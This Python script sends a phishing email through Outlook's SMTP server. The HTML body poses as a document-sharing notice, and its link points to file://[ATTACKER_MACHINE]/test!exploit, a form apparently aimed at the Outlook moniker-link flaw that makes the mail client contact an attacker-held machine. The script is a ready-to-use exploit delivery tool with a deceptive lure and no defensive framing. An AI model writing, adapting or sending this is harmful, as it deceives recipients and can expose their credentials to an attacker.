import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email():
    # Get user input for sender's email address and password
    sender_email = input("Enter your Outlook email address: ")
    sender_password = input("Enter your Outlook email password: ")

    # Get user input for receiver's email address
    receiver_email = input("Enter the recipient's email address: ")

    # Create a new message object
    msg = MIMEMultipart()

    # Add sender, receiver, and subject to the message
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = input("Enter email subject: ")

    # Ask user if they want to add a link attachment
    add_attachment = input("Do you want to add a link attachment? (yes/no): ").lower()
    if add_attachment == 'yes':
        html_content = """\
        <!DOCTYPE html>
            <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Document Sharing Notification</title>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            line-height: 1.6;
                        }
                        .container {
                           max-width: 600px;
                           margin: 20px auto;
                           padding: 20px;
                           border: 1px solid #ccc;
                           border-radius: 5px;
                        }
                        h2 {
                          color: #333;
                        }
                        p {
                            color: #666;
                        }
                        .link {
                            margin-top: 20px;
                         }
                        .link a {
                            display: inline-block;
                            padding: 10px 20px;
                            background-color: #007bff;
                            color: #fff;
                            text-decoration: none;
                            border-radius: 5px;
                        }
                    </style>
                    </head>
                    <body>
                        <div class="container">
                            <h2>Document Sharing Notification</h2>
                             <p>Dear [Recipient Name],</p>
                            <p>You have received a document shared with you. Please click the link below to access it:</p>
                            <div class="link">
                                <p><a href="file://[ATTACKER_MACHINE]/test!exploit">Click me</a></p>
                            </div>
                            <p>If you have any questions or concerns, please feel free to contact us.</p>
                            <p>Best regards,<br>[Your Name]</p>
                        </div>
                </body>
            </html>
"""
        msg.attach(MIMEText(html_content, 'html'))

    # Connect to SMTP server and send email
    with smtplib.SMTP('smtp-mail.outlook.com', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)
        print("Email sent successfully.")

if __name__ == "__main__":
    send_email()
